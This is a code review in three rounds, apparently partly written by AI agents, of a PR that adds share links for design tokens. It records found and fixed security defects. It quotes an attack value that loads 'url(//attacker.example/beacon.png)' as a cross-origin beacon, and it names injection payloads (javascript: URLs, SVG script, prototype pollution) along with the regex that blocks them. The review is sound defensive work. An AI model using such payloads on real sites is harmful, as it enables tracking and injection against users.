# Code review — PR #145 · /build slice 1c (#137)

**Reviewed**: `feature/build-pattern-render-137` → `main`
**Recommendation**: **Comment**, and the independent pass below is the one that matters

---

# ROUND 3 — reviewing the fixes, and the blast radius

Round 2 found four defects and they were fixed in `1cf3036` — **but round 2 reviewed the tree
*before* those fixes existed.** Nobody independent had read the fixes, and one of them changed
`vetTokens`, a predicate that `brand-import.mjs`, `dock.mjs`, `pack-derived.mjs`, `spine.mjs` and
`pack-boot.js` all sit downstream of. Round 3 is two passes over exactly that: the `code-reviewer`
agent on `f075d59..HEAD`, and an adversarial agent on the blast radius, driving real Chromium.

Two findings. Both fixed in `95bdb9a`. Both verified by me before acting.

## R3-1 · MEDIUM — my own comment asserted a protection that did not exist

`system/build-import.mjs` · The R2-2 fix added an empty-tokens guard to `adoptPack`, and the comment
(and commit message) justified it as also covering `succeed()`. **It does not.** Traced and
confirmed: `succeed()` never calls `adoptPack`, and this module's `BUILD_CHANGE` listener
deliberately filters out its own `source: "import"` publish — by design, and documented as such. So
`succeed()`'s `labelStage(\`Wearing ${r.fileName}. The stage only.\`)` was unconditional, with
nothing in its path.

Not exploitable today: `mapPack` throws before it can return with no placeable values, so
`record.tokens` from a genuine import is never empty. But that is an **upstream invariant, not a
check** — and the comment claimed a guard that was not there, which is worse than no comment,
because it tells the next reader the case is handled.

**Fixed** by guarding `succeed()`'s own label and correcting the comment to say what is true,
including that the earlier version was wrong.

## R3-2 · MEDIUM — group 7 pinned the guard's declaration, not its use

`tooling/build-checks.mjs` · The R2-1 mirror check asserted that `VALUE_BAD` and `BAD` were
*declared*. A mutation sweep proved **four ways past it while the guard was entirely dead**, gate
green every time:

| mutation | before |
|---|---|
| delete `\|\| VALUE_BAD.test(value)` from `vetTokens` | **MISSED** |
| delete `&& !BAD.test(v)` from the pre-paint loop | **MISSED** |
| comment the `VALUE_BAD` literal out | **MISSED** |
| widen `VALUE_OK` on one side only (mirror drift) | **MISSED** |

**Pinning a constant is not pinning a behaviour** — and this is the *third* time this branch has met
that same mistake, after the journey that shared a build with no pack and the tamper battery whose
only `url()` case rejected on the colon.

**Fixed**, checked three ways: the mirrored literals must be byte-identical (`KEY_NAME`↔`NAME`,
`VALUE_OK`↔`VAL`, `VALUE_BAD`↔`BAD`), both **use-sites** must be present in the conditions that
decide whether a value is applied, and the shipped `vetTokens` is **run** against five beacon shapes
and seven real value shapes. Re-ran the sweep afterwards: **6/6 mutations now caught**, working tree
restored clean.

## Blast radius — verified end to end, not by reading

The `vetTokens` change was the risk in this PR, and only one of its consumers had been checked.

| path | result |
|---|---|
| home's drop surface, 4 real fixtures | **PASS** — 64 mapped, 44 placed, **0 lost** vs the pre-fix predicate |
| wear-across-the-site → `pack-boot.js` on all 7 other pages | **PASS** — 44 applied everywhere, mirror partition **identical** to `vetTokens` |
| the appearance dock, 4 packs × 8 pages | **PASS** — 32/32 persist across navigation |
| `pack-derived` + the spine hero re-skin | **PASS** — 21 live inline props including 5 `color-mix(...)`, all still pass |
| `?brand=` share links | **PASS** |
| `/build` drop, derive, and share round trip | **PASS** — byte-identical token round trip |
| `instance.html`, proto pages | **N/A** — carry no `pack-boot` tag, verified in-page |

**No legitimate token value containing `url(` or `//` exists anywhere in the repo** — enumerated, not
grepped: all 361 custom-property declarations across six pack files, `tokens.source.json`, and 4×64
mapped fixture values. The two `url(` hits are `@import` at-rules at brace-depth 0, not token values.
Structurally, none of the five importable families is an image property.

**One behaviour change worth naming rather than folding into "clean":** a hand-built link carrying
`url(//host)` now fails the **entire** build, not just that token — the decoder's existing
zero-rejected rule doing its job. Only hostile links are affected; a single-slash
`rgb(0 0 0 / 10%)` link still decodes fine.

**Claim calibration**, in the adversarial agent's own terms: *"there is no regression"* is claimed
for the enumerated inputs above; *"I could not find a regression"* is the honest ceiling for
arbitrary unseen third-party exports, where a value containing `//` would now be reported as not
applied rather than placed. Not reached: Firefox/WebKit, and the portal drawer.

## Round 3 validation

`build-checks` ✓ (7 groups, 29 tamper payloads) · mutation sweep ✓ 6/6 caught · beacon proof ✓ zero
foreign requests · home's real drop ✓ zero new rejections · journey ✓ 43 assertions · `token-lint` ✓
· `drift-check` ✓ · `loc-summary --check` ✓ · CI `verify` + `visual` ✓.

## Round 3 verdict

The fixes hold, and the blast radius is clean across everything enumerable. What round 3 actually
caught was not a broken fix but **two false claims of safety** — a comment asserting a guard that
wasn't in the path, and a check asserting a constant instead of a behaviour. Both are the same
failure mode as the two defects before them, which is now the most useful thing this branch has
produced.

Still **Comment, not Approve**: solo repo, and a human should read R2-1's scope amendment
(`pack-imported.mjs` + `pack-boot.js` sit outside the plan's fence) before merging.

---

# ROUND 2 — the independent pass on the original code

Round 1 (kept below, unedited) was written by the session that wrote the code, and its own caveat
said it was not to be trusted as independent. That caveat turned out to be load-bearing: an
independent pass — the project's `code-reviewer` agent for standards, plus an adversarial agent that
built hostile payloads and drove real Chromium — found **four defects round 1 missed**, one of them
in the exact mechanism this PR exists to build.

Every finding below was reproduced by hand before being acted on. All four are **fixed in `1cf3036`**.

## R2-1 · MEDIUM (honesty-contract: must-fix) — a shared link could make third-party network requests

`system/pack-imported.mjs` · `VALUE_OK` excludes `:`, so `url(javascript:x)` was rejected — **and
that is exactly what hid this.** The tamper battery's only `url()` case was the one that could never
have got through, so a green gate was manufacturing confidence about a function it had never tested.
A protocol-relative URL needs no colon:

```
k: { "--color-bg": "url(//attacker.example/beacon.png)" }
```

Every character is inside `VALUE_OK`'s class. `.bx-stage`'s `background: var(--color-bg)` shorthand
expands it, and Chromium fires the cross-origin GET on load with no interaction. Verified: three
foreign requests observed. It also **re-fired on every reload** (`?b=` persists), **survived
re-sharing** (`encodeBuild` re-vets, and `url(` passed), and was written into the downloaded
`pattern-spec.md` for the visitor to paste into a real stylesheet.

Bounded precisely: `?` and `&` are excluded, so there is no query string — the beacon carries a
per-link path identifier only. No script execution. By security impact, Medium. **For this repo the
reason it is must-fix is different**: `/build` states at rest that nothing is uploaded, while making
a third-party request.

**The hole predates this ticket** — it is live on `main` today via home's drop surface, and via
`pack-boot.js` on the pre-paint site-wide path. A share link is what made it *remotely triggerable*,
which is why it was fixed here rather than deferred.

**Fixed**: `VALUE_BAD = /url\s*\(|\/\//i` beside `VALUE_OK`, mirrored by hand into
`system/pack-boot.js` (a classic script that cannot import). Also kills `image-set()`/`cross-fade()`,
which need a `url()` inside. **Scope note**: the plan listed `pack-imported.mjs` under "Not
changing"; amended on the owner's explicit call, since home and the dock share the same predicate.

**Verified no regression**: every real value shape still passes (`#hex`, `rgb(0 0 0 / 10%)`, `16px`,
`clamp(...)`, a shadow string, `color-mix(...)`, `var(--alias)`), and home's **real** drop surface
still maps `tooling/figma/fixtures/scales-dtcg.json` with zero new rejections and no page errors.
The only `url(` in committed CSS is saulera's `@import` header, and `@` was already excluded.

## R2-2 · MEDIUM — `k: {}` was accepted, and the page then claimed a design had arrived

`system/build-share.mjs` · `decodeBuild` capped `k`'s key count and checked `vetTokens`, but never
rejected an **empty** map. `adoptPack`'s guard was `!pack.tokens`, and `{}` is truthy — so
`applyToStage({})` was a correct no-op while three copy sites stated, verbatim, that the design was
on the stage. Same class as `f5550c2`, which this same PR fixed in the other direction.

The telling detail the reviewer caught: `build-keep.mjs:145` **already gets this right**
(`Object.keys(pack.tokens).length` before printing the CSS block). One consumer in this PR knew an
empty map means no design; the other didn't.

**Fixed** at the codec, so all three consumers read one truth, plus a guard at `adoptPack` — which
is not redundant, because `succeed()` is a second producer that can hand over an empty map when an
import maps nothing applyable.

## R2-3 · MEDIUM — `clip()` split surrogate pairs, and this needed no attacker at all

`system/build-card.mjs` · `clip()` did `t.slice(0, n-1)` on **UTF-16 units**, cutting emoji in half.
A lone surrogate makes the whole SVG XML-invalid, `DOMParser` refuses it, `svgNode` returns `null`,
and `cardEl.replaceChildren(...[])` left **an empty div with no message**.

Reachable by typing. A place named `Overview dashboard 1📊 weekly` is 29 units — nowhere near
`LABEL_MAX` — and the emoji lands exactly on the 22-character slot budget's cut. Measured: index 18
breaks `breadboard.svg`, 20 breaks the dashboard card, 24 breaks the place label. **The download path
had no parser to refuse it** and shipped raw `0x00` bytes.

**Fixed**: `clip()` counts code points; the keep card says something honest instead of showing a
blank panel; and group 6 now sweeps seven emoji cut-indices across three templates.

## R2-4 · MEDIUM — `decodeBuild` validated label length only

NUL, C0 controls and lone surrogates all passed. **Fixed** with a `labelOk()` predicate — written as
a loop rather than a regex on purpose: detecting a lone surrogate in one pattern needs a lookbehind,
and lookbehind is a **parse error** on Safari before 16.4, which would take the module down on
exactly the browsers the codec's `CompressionStream` fallback exists to serve.

## Not fixed, recorded

- **LOW · layout DoS** — `--spacing-md: 99999999px` passes `VALUE_OK` and pushes the Act 5 downloads
  to y=33,554,432, genuinely unclickable. Self-evident to the visitor, requires opening a hostile
  link, no data impact. A magnitude cap risks regressing real imports for less benefit than it costs.
- **LOW · bidi spoofing** — U+202E in a label renders and reaches the downloaded SVG. Cosmetic.

## What the adversarial pass CONFIRMED holds

Claimed as "I could not break it", not as "it is safe". **Repelled, with the mechanism named**:
declaration break-out (`VALUE_OK` is stricter than documented — it also excludes `@ ? = ! [ ] ^ ~ \` | $ _`);
`javascript:`/`data:` URLs (on the colon); prototype pollution (accepted-but-inert at the top level
and in `b`, rejected by name in `a` and as ids — `Object.hasOwn` reads, key-by-key construction from
trusted `QUESTIONS` ids, no recursive merge, and `KEY_NAME`'s `--family-` prefix makes `__proto__`
unwritable); SVG injection (`</text><script>`, `<foreignObject>`, `xlink:href="javascript:"`, `]]>`,
raw `&` — script count unchanged at baseline, zero `on*` attributes, `window.HACKED` never defined);
every cap; the deflate bomb; and the one-write-point claim, verified **repo-wide** — exactly one
`.setProperty(` across all ten `/build` modules, zero `innerHTML`/`insertAdjacentHTML`, no visitor
string reaching a filename.

*Scope caveat: browser results are Chromium-only. Firefox/WebKit may handle lone surrogates
differently, which would change R2-3's on-screen symptom but not the corrupt-download half.*

## The gate grew with the findings

`tooling/build-checks.mjs`: **14 tamper payloads → 29**, plus an astral clip-boundary sweep, plus
group 7 widened from one file to all eight `/build` modules with a `pack-boot.js` mirror check. Two
gaps that mattered structurally:

- The battery's only `url()` case rejected on the colon, so it tested nothing about `url()` — the
  precise reason R2-1 survived a green gate.
- Group 7 counted `.setProperty(` **in one file** while the prose claim was repo-wide. A second write
  in `build-keep.mjs` would not have tripped it.

One correction in the other direction: my first attempt asserted that a top-level `__proto__` key
must be *rejected*. It isn't, and shouldn't be — it decodes and changes nothing. The test was
asserting a behaviour the code correctly does not have, so it now asserts **non-pollution**, which is
the real invariant.

## Round 2 validation

| Gate | Result |
|---|---|
| `node tooling/build-checks.mjs` | ✓ 7 groups · 29 tamper payloads |
| beacon proof (Node + Chromium, request interception) | ✓ zero foreign requests · zero inline styles · refusal shown · param scrubbed |
| home's real drop surface, real fixture | ✓ still maps, zero new rejections, no page errors |
| headless journey | ✓ 43 assertions |
| `token-lint` · `drift-check` · `loc-summary --check` | ✓ |
| visual gate (clean worktree) | ✓ 18 passed; only `approach-*` moved (16,900 → 17,000 lines) |

## Round 2 verdict

The architecture and the honesty argument held up under genuinely adversarial probing — every
injection class was repelled by a named mechanism, not by luck. What did not hold was one negative
guard, and the reason is worth more than the bug: **a test that only exercised the impossible case
made the possible one invisible.**

Still **Comment, not Approve** — a solo repo cannot self-approve, and a human should read R2-1's
scope amendment (`pack-imported.mjs` + `pack-boot.js` were outside the plan's fence) before merging.

---

# ROUND 1 — the author's own review, kept unedited

Everything below was written before Round 2 and is left as it stood. Its central claim — that an
author's self-review is not a substitute for someone reading the diff cold — is now evidenced rather
than asserted.

## Caveat, stated first

This review was written by the session that wrote the code, so it is **not the fresh-eyes pass
`piv-review-pr` exists to be**. The `code-reviewer` agent was not dispatched: this session runs under
an explicit instruction not to use the Agent tool unless the user asks for it. Two consequences a
human should weigh:

1. Author bias is unmitigated. The findings below are the ones self-review can reach — invariants,
   boundaries, and things the gates can prove. They are not a substitute for someone reading this
   diff cold.
2. `gh pr review --approve` is not used, both for that reason and because a solo repo cannot
   formally self-approve. Posted as a comment.

One real bug WAS caught after implementation was declared done, by an outside reviewer, and it is
fixed in `f5550c2` — see "What review caught" below. That is evidence the caveat is not theoretical.

## Validation

| Gate | Result |
|---|---|
| `node tooling/build-checks.mjs` | ✓ all 7 groups, exit 0 |
| `node tooling/token-lint.mjs` | ✓ 64 contract tokens · 0 undeclared · 0 orphan |
| `node tooling/drift-check.mjs` | ✓ 8 checks |
| `node agent-layer/gen-loc-summary.mjs --check` | ✓ no drift |
| `node --check` × 10 modules | ✓ |
| headless journey (Chromium) | ✓ 43 assertions, 0 console errors |
| CI `verify` | ✓ pass |
| CI `visual` | ✓ pass (18 baselines; only the two `approach-*` moved, deliberately) |

## Findings

### Critical — none

### High — none

### Medium

**M1 · `tooling/build-checks.mjs` is committed but unregistered in CI.**
`tooling/build-checks.mjs` — check 3 validates both compositions against the real
`handoff/verdant/vocabulary.json`, and its stated job is "catches a vocabulary regeneration breaking
the builder". Nothing runs it automatically, so that guarantee is manual today. The plan did not ask
for CI registration and the PR body says so explicitly rather than letting the next session assume
coverage. **Fix**: add it to the `verify` job in #138, alongside that slice's gate sweep. Left as-is
here deliberately (out of this slice's scope), not overlooked.

**M2 · A restored page rewrites its own URL 400 ms after load.**
`system/build-keep.mjs:~290` — `restore()` sets `linkLive = true`, then `restoreBuild()` fires
`BUILD_CHANGE` → `update()` → the debounced `replaceState`. The re-encode is deterministic over the
same state, so the URL it writes is the one already there; the cost is one wasted encode per restored
page load and one history-entry replacement. Harmless, and it has a real upside (it normalises a
hand-edited or reordered link), but it is a side effect nobody asked for. **Fix if it ever matters**:
skip the first scheduled write when `update()` is running as a direct consequence of the restore.

### Low

**L1 · `stages` is captured once at mount.**
`system/build-import.mjs:103` — `[...document.querySelectorAll("[data-build-stage]")]` is read once.
It is correct today because `pattern-render.mjs` only ever `replaceChildren`s inside its root, so the
`[data-build-stage]` node itself persists. That is a real coupling between two modules and it is
undocumented at the query site. **Fix**: one comment naming the requirement, so the day someone
recreates the stage element the constraint is visible.

**L2 · `boardSvg`'s chip widths are estimated from a character constant.**
`system/build-card.mjs:234` — `CHAR_W = 6.2` approximates 12px system-ui. Wide labels in a
wide-glyph font could sit a few pixels proud of their chip border. Bounded by `clip(label, 20)` and
by `Math.min(w - 24, …)`, so it cannot overflow the box; only the chip's own border can be slightly
tight. Unavoidable without DOM measurement, which is the whole point of the module being Node-pure.

## What review caught (already fixed)

**`f5550c2` — a shared design printed "No design imported yet" beside a stage wearing it.**
The headless journey only ever shared a build with **no** imported pack, so the entire
restore-with-a-design path was unexercised on the page. `adoptPack()` applied the tokens but never
touched `[data-build-keep-empty]`, which starts visible. A colleague opening a shared link saw the
stage re-skinned while Act 5's "Your design" row said no design had been imported.

This is the **finding-12 class the plan legislated against in the other direction** — a sentence
that is true about one thing, read as a claim about everything. The plan caught the clear-the-stage
case and missed the symmetric restore case. Fixed by making `clearKeep()` take its message and
capture the markup's sentence as its default, and the journey now derives a palette before sharing
and asserts both stages, the token round-trip and the row's copy (43 assertions, up from 37).

Worth recording as a testing lesson, not just a bug: **the happy path was tested with the one input
that skipped the feature under test.**

## What is good

- **The render path is the real one.** `compose()` emits the same `{name, props, children}` the
  build-time agent runs emit, validated by the same generated vocabulary, and check 3 runs that
  assertion against `handoff/verdant/vocabulary.json` read from disk. A vocabulary regeneration that
  broke the builder would fail the gate rather than the page.
- **The one-application-point invariant is enforced at the choke point.** `vetTokens` moved *inside*
  `applyToStage` rather than sitting at its four call sites, one of which is now a stranger's URL.
  Check 7 asserts `.setProperty(` appears exactly once in the file — crude, cheap, and it fails loudly.
- **The codec refuses whole.** 14 hostile payloads plus caps and transport failures, each returning
  null with a reason. The zero-rejected **and** zero-skipped rule is the non-obvious one: `vetTokens`
  sorts an off-family key into `skipped`, so zero-rejected alone would have accepted `--evil` and a
  JSON-parsed `__proto__`.
- **Two honesty decisions are argued in the code, not just made.** The payload carries no pattern id
  (it is recomputed, so a link cannot claim a pattern its board does not produce) and no
  `label`/`note` (those describe the *sender's* browser; replaying them would have the receiving page
  state at rest that it read a file it never saw).
- **The out-of-library path is designed, not degraded.** Same card chrome, same weight, the pattern's
  definition, what it would need, and the breadboard beside it. Two of the four `shape` answers land
  there, so this is a majority path and it looks like one.

## Recommendation

**Comment, with a human read recommended before merge.** No critical or high findings; all gates and
both CI checks green; the diff matches the PR's stated intent and the plan's nine documented
deviations. M1 is scoped to #138 by decision. The binding reason not to approve is the caveat at the
top: this review is not independent, and the one real defect in this branch was found by someone
other than its author.
